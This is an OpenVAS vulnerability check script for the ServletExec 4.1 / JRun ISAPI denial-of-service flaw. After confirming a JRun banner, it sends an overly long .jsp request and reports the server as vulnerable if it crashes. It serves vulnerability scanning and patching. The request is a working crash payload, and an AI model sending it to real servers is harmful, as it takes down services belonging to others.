###############################################################################
# OpenVAS Vulnerability Test
# $Id: servletExec_DoS.nasl 14174 2019-03-14 11:16:59Z asteins $
#
# ServletExec 4.1 / JRun ISAPI DoS
#
# Authors:
# Matt Moore <matt.moore@westpoint.ltd.uk>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Wrong BugtraqID(6122). Changed to BID:4796. Added CAN.
#
# Copyright:
# Copyright (C) 2002 Matt Moore
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10958");
  script_version("$Revision: 14174 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-14 12:16:59 +0100 (Thu, 14 Mar 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(1570, 4796);
  script_cve_id("CVE-2002-0894", "CVE-2000-0681");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("ServletExec 4.1 / JRun ISAPI DoS");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("This script is Copyright (C) 2002 Matt Moore");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl", "no404.nasl");
  script_mandatory_keys("JRun/banner");
  script_require_ports("Services/www", 80);
  script_exclude_keys("www/too_long_url_crash");

  script_xref(name:"URL", value:"https://www.westpoint.ltd.uk/advisories/wp-02-0006.txt");
  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/6122");
  script_xref(name:"URL", value:"ftp://ftp.newatlanta.com/public/4_1/patches/");

  script_tag(name:"summary", value:"By sending an overly long request for a .jsp file it is
  possible to crash the remote web server.

  This problem is known as the ServletExec / JRun ISAPI DoS.");
  script_tag(name:"solution", value:"Solution for ServletExec:
  Download patch #9 from the referenced FTP URL.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");

port = get_http_port( default:80 );

if( http_is_dead( port:port, retry:1 ) ) exit( 0 );

banner = get_http_banner( port:port );
if( ! banner ) exit( 0 );
if( "JRun" >!<  banner ) exit( 0 );

buf = "/" + crap( 3000 ) + ".jsp";

req = http_get( item:buf, port:port );
res = http_send_recv( port:port, data:req );

if( http_is_dead( port:port ) ) {
  security_message( port:port );
}

exit( 99 );
